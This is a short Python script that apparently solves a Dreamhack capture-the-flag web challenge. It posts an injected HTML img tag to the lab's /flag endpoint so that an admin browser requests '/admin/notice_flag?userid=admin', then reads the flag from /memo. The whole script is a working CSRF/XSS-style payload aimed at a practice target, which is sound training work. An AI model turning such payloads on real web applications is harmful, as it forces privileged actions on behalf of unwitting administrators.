import requests

port = 23685
url_index = f"http://host1.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"
param = {"param": '<img src="/admin/notice_flag?userid=admin">'}
requests.post(url_flag, data=param)
response = requests.get(url_memo)
print(response.text)
